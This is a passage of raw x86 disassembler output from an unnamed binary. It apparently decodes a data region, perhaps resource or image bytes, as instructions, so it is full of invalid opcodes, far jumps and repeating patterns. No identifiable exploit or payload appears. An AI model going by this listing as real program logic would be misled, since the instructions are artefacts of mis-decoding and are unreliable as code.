  406ad8:	retf   0x4d88
  406adb:	add    bh,al
  406add:	pushf  
  406ade:	inc    esi
  406adf:	add    cl,dl
  406ae1:	xchg   esi,eax
  406ae2:	dec    esp
  406ae3:	add    ch,cl
  406ae5:	mov    ds,WORD PTR [eax+0x0]
  406ae8:	ret    0x5b9d
  406aeb:	add    dl,dl
  406aed:	cwde   
  406aee:	pop    eax
  406aef:	add    bl,cl
  406af1:	mov    eax,ds:0xa4d70046
  406af6:	inc    ecx
  406af7:	add    cl,bl
  406af9:	mov    ds:0xa8d30043,al
  406afe:	inc    ebx
  406aff:	add    al,bl
  406b01:	lods   al,BYTE PTR ds:[esi]
  406b02:	inc    ecx
  406b03:	add    dh,dl
  406b05:	lods   eax,DWORD PTR ds:[esi]
  406b06:	dec    ebx
  406b07:	add    bl,bl
  406b09:	test   al,0x4c
  406b0b:	add    ch,bl
  406b0d:	mov    bl,0x49
  406b0f:	add    ah,cl
  406b11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b12:	push   edx
  406b13:	add    ch,al
  406b15:	mov    al,ds:0xa6ca005b
  406b1a:	pop    edx
  406b1b:	add    ch,cl
  406b1d:	stos   BYTE PTR es:[edi],al
  406b1e:	pop    esi
  406b1f:	add    dh,dl
  406b21:	test   eax,0xb1d90058
  406b26:	pop    ebp
  406b27:	add    dl,ah
  406b29:	mov    bl,0x5b
  406b2b:	add    dh,al
  406b2d:	lahf   
  406b2e:	popa   
  406b2f:	add    bl,dl
  406b31:	pushf  
  406b32:	push   0x64a2c400
  406b37:	add    bl,cl
  406b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b3a:	addr16 add dh,al
  406b3d:	mov    ds:0xa3c8006f,al
  406b42:	outs   dx,DWORD PTR ds:[esi]
  406b43:	add    ah,al
  406b45:	test   al,0x6c
  406b47:	add    al,cl
  406b49:	test   eax,0xa2d6006d
  406b4e:	arpl   WORD PTR [eax],ax
  406b50:	shr    BYTE PTR [ebx-0x5125ffa0],cl
  406b56:	pusha  
  406b57:	add    cl,dl
  406b59:	mov    eax,ds:0xb5d9006f
  406b5e:	addr16 add dl,al
  406b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b62:	jno    0x406b64
  406b64:	int3   
  406b65:	mov    ds:0xa9c60070,eax
  406b6a:	je     0x406b6c
  406b6c:	int3   
  406b6d:	stos   BYTE PTR es:[edi],al
  406b6e:	jno    0x406b70
  406b70:	lds    ebp,FWORD PTR [ebx-0x5237ff85]
  406b76:	jl     0x406b78
  406b78:	shl    BYTE PTR [edx-0x5428ff90],cl
  406b7e:	jg     0x406b80
  406b80:	int    0xb0
  406b82:	js     0x406b84
  406b84:	fidivr DWORD PTR [ebx-0x451dff89]
  406b8a:	ins    DWORD PTR es:[edi],dx
  406b8b:	add    dl,ah
  406b8d:	mov    esp,0xc2df007c
  406b92:	jns    0x406b94
  406b94:	in     eax,0xc2
  406b96:	jns    0x406b98
  406b98:	push   ds
  406b99:	jae    0x406b38
  406b9b:	add    BYTE PTR [esi],bh
  406b9d:	jl     0x406b36
  406b9f:	add    BYTE PTR [esp+edi*2],ah
  406ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ba3:	add    BYTE PTR [edi+0x76],al
  406ba6:	xchg   DWORD PTR [eax],eax
  406ba8:	daa    
  406ba9:	sub    BYTE PTR [ebp-0x506ad400],0x0
  406bb0:	sub    DWORD PTR [ecx-0x71c5ff4c],ecx
  406bb6:	mov    dl,0x0
  406bb8:	xchg   di,ax
  406bba:	nop
  406bbb:	add    BYTE PTR [ecx-0x7a],al
  406bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bbf:	add    BYTE PTR [esi-0x67],cl
  406bc2:	mov    ecx,0xb79c5b00
  406bc7:	add    BYTE PTR [eax+ebp*4-0x53],bl
  406bcb:	add    BYTE PTR [ecx-0x58],cl
  406bce:	mov    edx,0xb6ae5d00
  406bd3:	add    BYTE PTR [esi-0x54],ch
  406bd6:	test   eax,0xaaad7300
  406bdb:	add    BYTE PTR [edx-0x5a],dh
  406bde:	mov    esi,0xbcb16500
  406be3:	add    BYTE PTR [edx],al
  406be5:	sahf   
  406be6:	fiadd  WORD PTR [eax]
  406be8:	aaa    
  406be9:	sahf   
  406bea:	enter  0x200,0xa1
  406bee:	fild   WORD PTR [eax]
  406bf0:	sub    eax,0x3400cea1
  406bf5:	mov    ds:0xb13c00cd,al
  406bfa:	iret   
  406bfb:	add    BYTE PTR [eax],bh
  406bfd:	scas   eax,DWORD PTR es:[edi]
  406bfe:	fld    DWORD PTR [eax]
  406c00:	cs mov al,0xdd
  406c03:	add    BYTE PTR [eax],al
  406c05:	popf   
  406c06:	loopne 0x406c08
  406c08:	add    esp,DWORD PTR [ebp-0x57e6ff1a]
  406c0e:	loopne 0x406c10
  406c10:	or     eax,0x1a00edb0
  406c15:	mov    bl,0xec
  406c17:	add    BYTE PTR [edi],cl
  406c19:	mov    cl,0xf0
  406c1b:	add    BYTE PTR [eax+edi*4],bl
  406c1e:	icebp  
  406c1f:	add    BYTE PTR [edi],ah
  406c21:	scas   eax,DWORD PTR es:[edi]
  406c22:	out    0x0,al
  406c24:	sub    dh,BYTE PTR [esi-0x43ceff1a]
  406c2a:	in     eax,dx
  406c2b:	add    BYTE PTR [ebx],ah
  406c2d:	mov    ebx,0xac4200f1
  406c32:	enter  0x5c00,0xad
  406c36:	les    eax,FWORD PTR [eax]
  406c38:	dec    ebx
  406c39:	mov    dl,0xcb
  406c3b:	add    BYTE PTR [eax-0x4c],bl
  406c3e:	mov    BYTE PTR [eax],0x42
  406c41:	lods   al,BYTE PTR ds:[esi]
  406c42:	rol    DWORD PTR [eax],cl
  406c44:	dec    eax
  406c45:	mov    bh,0xd7
  406c47:	add    BYTE PTR [eax-0x44],dl
  406c4a:	fld    DWORD PTR [eax]
  406c4c:	ins    DWORD PTR es:[edi],dx
  406c4d:	mov    bh,0xc2
  406c4f:	add    BYTE PTR [ebx-0x47],ch
  406c52:	fiadd  DWORD PTR [eax]
  406c54:	jl     0x406c11
  406c56:	rol    DWORD PTR [eax],1
  406c58:	inc    ebp
  406c59:	mov    ebp,0xc23500e3
  406c5e:	repz add BYTE PTR [edi-0x3a],dh
  406c62:	fild   DWORD PTR [eax]
  406c64:	inc    esp
  406c65:	(bad)  
  406c66:	out    dx,al
  406c67:	add    BYTE PTR [ebx-0x35],bl
  406c6a:	in     eax,dx
  406c6b:	add    BYTE PTR [ecx-0x39],cl
  406c6e:	icebp  
  406c6f:	add    BYTE PTR [ebx-0x32],bl
  406c72:	lock add BYTE PTR [ebp-0x30],bl
  406c76:	icebp  
  406c77:	add    BYTE PTR [ebx+ecx*8-0x16],ah
  406c7b:	add    BYTE PTR [ebp-0x2e],ah
  406c7e:	icebp  
  406c7f:	add    BYTE PTR [eax+ebx*8-0xe],dh
  406c83:	add    BYTE PTR [edx-0x3fff7c5a],bh
  406c89:	stos   DWORD PTR es:[edi],eax
  406c8a:	add    DWORD PTR [eax],0xffffffcb
  406c8d:	mov    bl,0x87
  406c8f:	add    bh,dl
  406c91:	mov    ebx,0xbbe30088
  406c96:	add    BYTE PTR [eax],0xde
  406c99:	ret    0x85
  406c9c:	ffreep st(6)
  406c9e:	xchg   edx,eax
  406c9f:	add    dh,bl
  406ca1:	(bad)  
  406ca2:	popf   
  406ca3:	add    dh,ah
  406ca5:	enter  0x88,0xe3
  406ca9:	les    edx,FWORD PTR [ebx-0x6a351d00]
  406caf:	add    dl,ch
  406cb1:	into   
  406cb2:	xchg   esp,eax
  406cb3:	add    bl,ah
  406cb5:	(bad)  
  406cb6:	pushf  
  406cb7:	add    ch,ah
  406cb9:	int    0x9b
  406cbb:	add    bl,ch
  406cbd:	rcr    DWORD PTR [edx-0x5d362200],1
  406cc3:	add    ah,ah
  406cc5:	retf   
  406cc6:	mov    ds:0xaacfea00,al
  406ccb:	add    ah,ch
  406ccd:	(bad)  
  406cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ccf:	add    al,dh
  406cd1:	fisubr DWORD PTR [eax+eax*1+0xb3d6ed]
  406cd8:	out    dx,al
  406cd9:	(bad)  [edx-0x45251500]
  406cdf:	add    cl,dh
  406ce1:	fnsave [esi-0x401a0c00]
  406ce7:	add    BYTE PTR [ebx-0x75ff3042],bl
  406ced:	(bad)  
  406cee:	fild   DWORD PTR [eax]
  406cf0:	xchg   ebp,eax
  406cf1:	retf   0xda
  406cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cf5:	enter  0xd7,0x9a
  406cf9:	aad    0xe3
  406cfb:	add    BYTE PTR [esi+ebx*8-0x2856ff0c],cl
  406d02:	in     eax,0x0
  406d04:	mov    dh,0xda
  406d06:	call   0xf524f90b
  406d0b:	add    BYTE PTR [ebp-0x52ff0a1a],dl
  406d11:	in     al,0xef
  406d13:	add    BYTE PTR [ebx-0x5bff1620],dh
  406d19:	in     eax,dx
  406d1a:	test   BYTE PTR [eax],0xaa
  406d1d:	lock test DWORD PTR [eax],0xfaf3ba
  406d24:	in     al,dx
  406d25:	loopne 0x406ced
  406d27:	add    bl,dh
  406d29:	in     eax,0xc9
  406d2b:	add    ah,dh
  406d2d:	jmp    0xdc:0xeef800d5
  406d34:	clc    
  406d35:	lock fiadd DWORD PTR [eax]
  406d38:	(bad)  
  406d39:	idiv   ebx
  406d3b:	add    ah,dl
  406d3d:	(bad)  
  406d3e:	inc    BYTE PTR [eax]
  406d40:	div    al
  406d42:	in     al,0x0
  406d44:	stc    
  406d45:	repnz in eax,0x0
  406d48:	div    edx
  406d4a:	call   0xea35674f
  406d4f:	add    ah,bh
  406d51:	clc    
  406d52:	out    dx,eax
  406d53:	add    ah,bh
  406d55:	clc    
  406d56:	icebp  
  406d57:	add    BYTE PTR [eax],al
  406d59:	add    BYTE PTR [eax],al
  406d5b:	add    bh,bh
  406d5d:	(bad)  
  406d5e:	inc    DWORD PTR [eax]
	...
  406e94:	pop    eax
  406e95:	or     DWORD PTR [ecx],ecx
  406e97:	or     DWORD PTR [ecx],ecx
  406e99:	or     DWORD PTR [ecx],ecx
  406e9b:	or     DWORD PTR [ecx],ecx
  406e9d:	or     DWORD PTR [ecx],ecx
  406e9f:	or     DWORD PTR [ecx],ecx
  406ea1:	or     DWORD PTR [ecx],ecx
  406ea3:	or     DWORD PTR [ecx],ecx
  406ea5:	or     DWORD PTR [ecx],ecx
  406ea7:	or     eax,0x57
	...
  406ec0:	add    BYTE PTR [eax],al
  406ec2:	add    BYTE PTR [edx+0x58568485],al
  406ec8:	pop    eax
  406ec9:	pop    ecx
  406eca:	add    BYTE PTR [eax-0x7e878880],0x81
  406ed1:	add    DWORD PTR [esi-0x7981817a],0x547587
	...
  406ef3:	or     eax,0x4030aca
  406ef8:	pop    es
  406ef9:	pop    es
  406efa:	or     cl,BYTE PTR [ebx]
  406efc:	or     ecx,DWORD PTR [eax]
  406efe:	or     BYTE PTR [edi],cl
  406f00:	adc    BYTE PTR [edi],cl
  406f02:	adc    al,0x17
  406f04:	adc    al,0x13
  406f06:	adc    ebx,DWORD PTR [edx]
  406f08:	xchg   BYTE PTR [eax+eax*1],ch
	...
  406f23:	inc    esi
  406f24:	and    BYTE PTR [edi],0xc
  406f27:	or     eax,0x2a29231e
  406f2c:	and    ah,BYTE PTR [edx]
  406f2e:	cmp    BYTE PTR [eax],bh
  406f30:	cmp    BYTE PTR [ecx],bh
  406f32:	aaa    
  406f33:	aaa    
  406f34:	sbb    BYTE PTR [edi],dl
  406f36:	adc    edx,DWORD PTR [ebx]
  406f38:	pop    esi
  406f39:	jae    0x406f04
	...
  406f53:	push   ebp
  406f54:	add    BYTE PTR [esi+0x1e],0x23
  406f58:	dec    eax
  406f59:	icebp  
  406f5a:	fild   QWORD PTR [edi+0x3d]
  406f5d:	ds jl  0x406f35
  406f60:	(bad)  
  406f62:	aad    0xd2
  406f64:	jnp    0x406f7e
  406f66:	pop    ss
  406f67:	adc    ebx,DWORD PTR [ebx+eax*4]
  406f6a:	push   ebx
	...
  406f83:	test   BYTE PTR [ebp+0x4c],cl
  406f86:	push   ds
  406f87:	sub    DWORD PTR [ecx-0xd],ecx
  406f8a:	cli    
  406f8b:	clc    
  406f8c:	iret   
  406f8d:	addr16 mov ebx,edi
  406f90:	(bad)  
  406f92:	fstp   st(5)
  406f94:	ficomp DWORD PTR [ecx]
  406f96:	pop    ss
  406f97:	adc    ebx,DWORD PTR [edx]
  406f99:	xchg   BYTE PTR [ebp+0x0],al
	...
  406fb0:	add    BYTE PTR [eax],al
  406fb2:	add    bl,cl
  406fb4:	sub    ecx,DWORD PTR [edi+0x1e]
  406fb7:	and    ebp,DWORD PTR ds:0xfafbdf64
  406fbd:	fild   QWORD PTR [ecx+0x71]
  406fc0:	jg     0x40703f
  406fc2:	jnp    0x407034
  406fc4:	pop    esp
  406fc5:	pop    ss
  406fc6:	pop    ss
  406fc7:	adc    eax,DWORD PTR [esi]
  406fc9:	je     0x406fd8
	...
  406fe3:	add    BYTE PTR ds:0x241f2379,cl
  406fe9:	cmp    eax,0xfbf8d33d
  406fee:	repz mov ah,BYTE PTR [ebp+0x3f]
  406ff2:	aas    
  406ff3:	xor    DWORD PTR [ecx],esi
  406ff5:	adc    eax,0x61051314
  406ffa:	inc    edi
	...
  407013:	add    BYTE PTR [esi-0x7e],al
  407016:	and    esp,DWORD PTR [ebx]
  407018:	and    BYTE PTR [ebx+edi*1],ah
  40701b:	inc    eax
  40701c:	jg     0x407011
  40701e:	sti    
  40701f:	clc    
  407020:	xlat   BYTE PTR ds:[ebx]
  407021:	gs aas 
  407023:	aas    
  407024:	sbb    DWORD PTR [esi],edx
  407026:	adc    eax,0x735e1313
  40702b:	pop    ebx
	...
  407044:	jne    0x406fc9
  407046:	dec    edx
  407047:	and    esp,DWORD PTR [eax]
  407049:	das    
  40704a:	xor    eax,0xdc67413b
  40704f:	sti    
  407050:	sti    
  407051:	loope  0x4070c3
  407053:	aas    
  407054:	xor    al,0x19
  407056:	push   ss
  407057:	adc    al,0x13
  407059:	sbb    al,0x7e
  40705b:	dec    esi
	...
  407068:	add    BYTE PTR [eax],al
  40706a:	add    BYTE PTR [edi-0x68686867],bl
  407070:	(bad)  
  407071:	xchg   ecx,eax
  407072:	add    DWORD PTR [edx],eax
  407074:	inc    ebx
  407075:	dec    ebp
  407076:	jne    0x4070a5
  407078:	cmp    bh,BYTE PTR [edx]
  40707a:	xor    eax,0x68413c35
  40707f:	shl    ebp,1
  407081:	sti    
  407082:	cmc    
  407083:	mov    bh,BYTE PTR [edi]
  407085:	xor    al,0x16
  407087:	push   ss
  407088:	adc    al,0x1b
  40708a:	xchg   BYTE PTR [edi],ah
	...
  407098:	jecxz  0x40702f
  40709a:	cdq    
  40709b:	mov    ch,0xc0
  40709d:	out    dx,eax
  40709e:	out    dx,eax
  40709f:	jmp    0x407068
  4070a1:	mov    esi,0x23969ba6
  4070a6:	mov    BYTE PTR [edi+0x5f],bl
  4070a9:	fs fs gs inc eax
  4070ad:	inc    ecx
  4070ae:	push   0xfbfb8d6b
  4070b3:	cmc    
  4070b4:	aas    
  4070b5:	xor    al,0x34
  4070b7:	push   ss
  4070b8:	push   ss
  4070b9:	sbb    DWORD PTR [ebx+0x1e],edi
	...
  4070c4:	add    BYTE PTR [eax],al
  4070c6:	add    BYTE PTR [edx-0x373d465e],ah
  4070cc:	jmp    0x4070bd
  4070ce:	out    dx,al
  4070cf:	jmp    0x259b:0xb4a6bec5
  4070d6:	int3   
  4070d7:	outs   dx,DWORD PTR ds:[esi]
  4070d8:	ins    BYTE PTR es:[edi],dx
  4070d9:	ins    BYTE PTR es:[edi],dx
  4070da:	jo     0x40714c
  4070dc:	jno    0x40715d
  4070de:	mov    cl,BYTE PTR [ebp-0x2b04040b]
  4070e4:	aas    
  4070e5:	ss xor al,0x2e
  4070e8:	push   ss
  4070e9:	push   ss
  4070ea:	arpl   WORD PTR [edx+0x0],cx
	...
  4070f5:	add    BYTE PTR [ebx+ebp*4-0x373b3e4d],bh
  4070fc:	jmp    0x4070ed
  4070fe:	out    dx,al
  4070ff:	jmp    0x429a:0x9bb4bec5
  407106:	int3   
  407107:	jg     0x407185
  407109:	jl     0x407187
  40710b:	jg     0x407097
  40710d:	mov    ecx,ss
  40710f:	cmc    
  407110:	cld    
  407111:	cld    
  407112:	loope  0x40709e
  407114:	jb     0x407180
  407116:	gs aas 
  407118:	aas    
  407119:	cmp    DWORD PTR [eax+0x78],esp
  40711c:	pop    ecx
	...
  407125:	add    BYTE PTR [ebp-0x3a3e4c52],ah
  40712b:	enter  0xefeb,0xee
  40712f:	jmp    0x509d:0x9cb7bac5
  407136:	mov    dh,cl
  407138:	mov    DWORD PTR [ecx-0x2b317377],ecx
  40713e:	cmc    
  40713f:	cld    
  407140:	cld    
  407141:	repz lea ecx,[ebp-0x75757573]
  407148:	mov    bh,BYTE PTR [edi-0x33]
  40714b:	int3   
  40714c:	dec    ebx
	...
  407155:	add    BYTE PTR [ebp-0x3a3e4c52],ah
  40715b:	enter  0xefeb,0xee
  40715f:	jmp    0x519e:0xa0b7bac5
  407166:	dec    edi
  407167:	aad    0x8b
  407169:	mov    esi,cs
  40716b:	iret   
  40716c:	shl    ebx,cl
  40716e:	cld    
  40716f:	cld    
  407170:	cmc    
  407171:	aam    0xd1
  407173:	ror    DWORD PTR [ebp-0x72727273],1
  407179:	int    0xcd
  40717b:	fldenv [esi]
	...
  407185:	add    BYTE PTR [ebp-0x3a3e4c54],ah
  40718b:	enter  0xefeb,0xee
  40718f:	jmp    0x9ea0:0xb7b6bac5
  407196:	and    ebx,edx
  407198:	iret   
  407199:	iret   
  40719a:	rcl    edi,cl
  40719c:	repz cld 
  40719e:	cld    
  40719f:	sti    
  4071a0:	xlat   BYTE PTR ds:[ebx]
  4071a1:	aam    0xd4
  4071a3:	rcl    esp,1
  4071a5:	aam    0xd1
  4071a7:	aam    0xd1
  4071a9:	rcl    ecx,1
  4071ab:	fisubr DWORD PTR [eax+eax*1]
	...
  4071b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071b7:	scas   al,BYTE PTR es:[edi]
  4071b8:	mov    bl,0xc1
  4071ba:	(bad)  
  4071bb:	enter  0xefeb,0xee
  4071bf:	jmp    0xb5b6:0xa6bebec2
  4071c6:	and    eax,0xd6d7d6da
  4071cb:	(bad)  
  4071cd:	cld    
  4071ce:	cld    
  4071cf:	(bad)  
  4071d1:	aam    0xd7
  4071d3:	aam    0xd4
  4071d5:	aam    0xd4
  4071d7:	aam    0xd4
  4071d9:	aam    0xd4
  4071db:	(bad)  [ebp+0x0]
	...
  4071e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071e7:	lods   al,BYTE PTR ds:[esi]
  4071e8:	mov    bl,0xc1
  4071ea:	(bad)
  4071ed:	out    dx,eax
  4071ee:	out    dx,al
  4071ef:	jmp    0xbbb7:0xb6b9bec4
  4071f6:	inc    esp
  4071f7:	fcomp  st(4)
  4071f9:	fcmovnu st,st(3)
  4071fb:	fdivrp st(5),st
  4071fd:	clc    
  4071fe:	loopne 0x4071db
  407200:	fcmovnu st,st(3)
  407202:	fcmovnu st,st(3)
  407204:	(bad)  
  407206:	(bad)  
  407208:	(bad)  
  40720a:	fcmovu st,st(4)
  40720c:	int3   
  40720d:	pop    eax
	...
  407216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407217:	lods   al,BYTE PTR ds:[esi]
  407218:	mov    bl,0xc1
  40721a:	(bad)
  40721d:	out    dx,eax
  40721e:	out    dx,al
  40721f:	jmp    0xbbbb:0xb6bebec4
  407226:	push   edx
  407227:	mov    cl,dh
  407229:	(bad)  
  40722b:	(bad)  
  40722d:	loopne 0x40720f
  40722f:	(bad)  
  407231:	(bad)  
  407233:	(bad)  
  407235:	(bad)  
  407237:	(bad)  
  407239:	(bad)  
  40723b:	loopne 0x407216
  40723d:	dec    ebx
	...
  407246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407247:	lods   al,BYTE PTR ds:[esi]
  407248:	mov    bl,0xc1
  40724a:	(bad)  
  40724b:	enter  0xefeb,0xee
  40724f:	jmp    0xa7b1:0xb1b1b2c4
  407256:	mov    eax,0xf2f2d81e
  40725b:	repnz repnz repnz repnz repz repnz repnz repnz loope 0x407246
  407265:	repnz loope 0x40725b
  407268:	loope  0x40725c
  40726a:	repnz loope 0x4071f0
  40726d:	retf   
	...
  407276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407277:	lods   al,BYTE PTR ds:[esi]
  407278:	mov    bl,0xc3
  40727a:	(bad)
  40727d:	out    dx,eax
  40727e:	out    dx,al
  40727f:	jmp    0xaaaa:0xacadb2c4
  407286:	mov    eax,ds:0xc0c1d93
  40728b:	or     al,0xc
  40728d:	or     al,0xc
  40728f:	or     DWORD PTR [ecx],ecx
  407291:	or     DWORD PTR [ecx],ecx
  407293:	pop    ds
  407294:	push   ds
  407295:	pop    ds
  407296:	or     DWORD PTR [edi],ebx
  407298:	or     DWORD PTR [edi],ebx
  40729a:	or     ebx,DWORD PTR [esi]
  40729c:	retf   
	...
  4072a5:	add    BYTE PTR [ebp-0x3a3e4c54],ah
  4072ab:	enter  0xefeb,0xee
  4072af:	jmp    0xaaaa:0xacadb2c4
  4072b6:	mov    eax,ds:0x8eaaa1a1
	...
  4072d3:	add    BYTE PTR [eax],al
  4072d5:	add    BYTE PTR [ebp-0x3b3c4c54],ah
  4072db:	enter  0xefeb,0xee
  4072df:	jmp    0xaaaa:0xaaadb2c4
  4072e6:	mov    ds:0x8ea9a1a1,eax
	...
  407303:	add    BYTE PTR [eax],al
  407305:	add    BYTE PTR [ebp-0x3a3c4c54],ah
  40730b:	enter  0xefeb,0xee
  40730f:	jmp    0xaaaa:0xacadb2c4
  407316:	mov    ds:0x8eaaa1a1,eax
	...
  407333:	add    BYTE PTR [eax],al
  407335:	add    BYTE PTR [ebp-0x3a3c4c54],ah
  40733b:	enter  0xefeb,0xee
  40733f:	jmp    0xaaaa:0xaaadb2c4
  407346:	stos   BYTE PTR es:[edi],al
  407347:	mov    eax,ds:0x8ea1a1
	...
  407364:	add    BYTE PTR [eax],al
  407366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407367:	lods   al,BYTE PTR ds:[esi]
  407368:	mov    bl,0xc1
  40736a:	(bad)
  40736d:	out    dx,eax
  40736e:	out    dx,al
  40736f:	jmp    0xaaaa:0xacadb2c4
  407376:	mov    eax,ds:0x92aaa1a1
	...
  407393:	add    BYTE PTR [eax],al
  407395:	add    BYTE PTR [ebp-0x3d3c4c54],ah
  40739b:	enter  0xefeb,0xee
  40739f:	jmp    0xaaaa:0xaaadb2c4
  4073a6:	stos   BYTE PTR es:[edi],al
  4073a7:	mov    eax,ds:0x90a1a1
	...
  4073c4:	add    BYTE PTR [eax],al
  4073c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073c7:	lods   al,BYTE PTR ds:[esi]
  4073c8:	mov    bl,0xc1
  4073ca:	(bad)  
  4073cb:	enter  0xefeb,0xee
  4073cf:	jmp    0xaaaa:0xacadb2c4
  4073d6:	mov    ds:0x92a1a1a1,eax
	...
  4073f3:	add    BYTE PTR [eax],al
  4073f5:	add    BYTE PTR [ebp-0x3b3e4c52],ah
  4073fb:	enter  0xefeb,0xee
  4073ff:	jmp    0xaaaa:0xacadb2c4
  407406:	mov    eax,ds:0x92a1a1a1
	...
  407423:	add    BYTE PTR [eax],al
  407425:	add    BYTE PTR [ebp-0x3a3e4c54],ah
  40742b:	enter  0xefeb,0xee
  40742f:	jmp    0xaaaa:0xaaadb2c4
  407436:	stos   BYTE PTR es:[edi],al
  407437:	mov    eax,ds:0x92a1a1
	...
  407454:	add    BYTE PTR [eax],al
  407456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407457:	lods   al,BYTE PTR ds:[esi]
  407458:	mov    bl,0xc1
  40745a:	(bad)  
  40745b:	enter  0xefea,0xee
  40745f:	jmp    0xaaaa:0xaaacb3c3
  407466:	mov    ds:0x94a9a1a1,eax
	...
  407483:	add    BYTE PTR [eax],al
  407485:	add    BYTE PTR [esp+ebp*4-0x373a3e53],ah
  40748c:	out    dx,al
  40748d:	out    dx,eax
  40748e:	out    dx,eax
  40748f:	jmp    0x407459
  407491:	ret    
  407492:	mov    edi,0xa9a9acad
  407497:	mov    eax,ds:0x94a1a1
	...
  4074b4:	add    BYTE PTR [eax],al
  4074b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b7:	lods   al,BYTE PTR ds:[esi]
  4074b8:	mov    edi,0xf0f0ebc8
  4074bd:	div    al
  4074bf:	lock lock out dx,eax
  4074c2:	jmp    0x4074af
  4074c4:	enter  0xb0c4,0xab
  4074c8:	test   eax,0x94a9
	...
  4074e5:	add    BYTE PTR [eax-0x90f143d],bh
  4074eb:	div    dh
  4074ed:	div    dh
  4074ef:	lock div dh
  4074f2:	div    dh
  4074f4:	div    al
  4074f6:	jmp    0x4074df
  4074f8:	ret    
  4074f9:	test   eax,0x94
	...
  407516:	jecxz  0x40750e
  407518:	div    bh
  40751a:	div    esi
  40751c:	div    dh
  40751e:	div    dh
  407520:	div    dh
  407522:	lock div al
  407525:	div    dh
  407527:	div    al
  407529:	(bad)  
  40752a:	cwde   
	...
  407543:	add    BYTE PTR [eax],al
  407545:	add    al,ch
  407547:	in     al,dx
  407548:	div    edi
  40754a:	div    edi
  40754c:	div    esi
  40754e:	div    esi
  407550:	div    dh
  407552:	div    dh
  407554:	div    dh
  407556:	lock div dh
  407559:	in     al,0xe2
	...
  407577:	jmp    0xea275c62
  40757c:	div    bh
  40757e:	div    edi
  407580:	div    edi
  407582:	div    esi
  407584:	in     al,dx
  407585:	out    0xe6,al
  407587:	jecxz  0x407546
  407589:	in     eax,0x0
	...
  4075a7:	add    BYTE PTR [eax],al
  4075a9:	add    cl,ch
  4075ab:	jmp    0xe5245a93
  4075b0:	in     al,0xe3
  4075b2:	jecxz  0x407597
  4075b4:	mov    ebp,0xe8e6
	...
  40765d:	add    BYTE PTR [eax],al
  40765f:	add    bh,bh
  407661:	(bad)  
  407662:	(bad)  
  407663:	(bad)  
  407664:	(bad)  
  407665:	inc    DWORD PTR [eax]
  407667:	add    bh,bh
  407669:	(bad)  
  40766a:	(bad)  
  40766b:	(bad)  
  40766c:	(bad)  
  40766d:	inc    DWORD PTR [eax]
  40766f:	add    bh,bh
  407671:	(bad)  
  407672:	(bad)  
  407673:	(bad)  
  407674:	(bad)  
  407675:	inc    DWORD PTR [eax]
  407677:	add    bh,bh
  407679:	(bad)  
  40767a:	(bad)  
  40767b:	(bad)  
  40767c:	(bad)  
  40767d:	inc    DWORD PTR [eax]
  40767f:	add    bh,bh
  407681:	(bad)  
  407682:	(bad)  
  407683:	(bad)  
  407684:	(bad)  
  407685:	inc    DWORD PTR [eax]
  407687:	add    bh,bh
  407689:	(bad)  
  40768a:	(bad)  
  40768b:	(bad)  
  40768c:	(bad)  
  40768d:	inc    DWORD PTR [eax]
  40768f:	add    bh,bh
  407691:	push   eax
  407693:	add    BYTE PTR [eax],al
  407695:	jg     0x407697
  407697:	add    bh,bh
  407699:	jmp    eax
  40769b:	add    BYTE PTR [eax],al
  40769d:	aas    
  40769e:	add    BYTE PTR [eax],al
  4076a0:	(bad)  
  4076a1:	jmp    eax
  4076a3:	add    BYTE PTR [eax],al
  4076a5:	aas    
  4076a6:	add    BYTE PTR [eax],al
  4076a8:	(bad)  
  4076a9:	jmp    eax
  4076ab:	add    BYTE PTR [eax],al
  4076ad:	pop    ds
  4076ae:	add    BYTE PTR [eax],al
  4076b0:	(bad)  
  4076b1:	jmp    eax
  4076b3:	add    BYTE PTR [eax],al
  4076b5:	pop    ds
  4076b6:	add    BYTE PTR [eax],al
  4076b8:	(bad)  
  4076b9:	jmp    eax
  4076bb:	add    BYTE PTR [eax],al
  4076bd:	pop    ds
  4076be:	add    BYTE PTR [eax],al
  4076c0:	(bad)  
  4076c1:	jmp    eax
  4076c3:	add    BYTE PTR [eax],al
  4076c5:	pop    ds
  4076c6:	add    BYTE PTR [eax],al
  4076c8:	(bad)  
  4076c9:	push   eax
  4076cb:	add    BYTE PTR [eax],al
  4076cd:	pop    ds
  4076ce:	add    BYTE PTR [eax],al
  4076d0:	(bad)  
  4076d1:	push   eax
  4076d3:	add    BYTE PTR [eax],al
  4076d5:	sldt   WORD PTR [eax]
  4076d8:	(bad)  
  4076d9:	push   eax
  4076db:	add    BYTE PTR [eax],al
  4076dd:	sldt   WORD PTR [eax]
  4076e0:	jmp    eax
  4076e2:	add    BYTE PTR [eax],al
  4076e4:	add    BYTE PTR [edi],cl
  4076e6:	add    BYTE PTR [eax],al
  4076e8:	inc    DWORD PTR [eax]
  4076ea:	add    BYTE PTR [eax],al
  4076ec:	add    BYTE PTR [edi],cl
  4076ee:	add    BYTE PTR [eax],al
  4076f0:	inc    BYTE PTR [eax]
  4076f2:	add    BYTE PTR [eax],al
  4076f4:	add    BYTE PTR [edi],cl
  4076f6:	add    BYTE PTR [eax],al
  4076f8:	cld    
  4076f9:	add    BYTE PTR [eax],al
  4076fb:	add    BYTE PTR [eax],al
  4076fd:	pop    es
  4076fe:	add    BYTE PTR [eax],al
  407700:	cld    
  407701:	add    BYTE PTR [eax],al
  407703:	add    BYTE PTR [eax],al
  407705:	pop    es
  407706:	add    BYTE PTR [eax],al
  407708:	cld    
  407709:	add    BYTE PTR [eax],al
  40770b:	add    BYTE PTR [eax],al
  40770d:	pop    es
  40770e:	add    BYTE PTR [eax],al
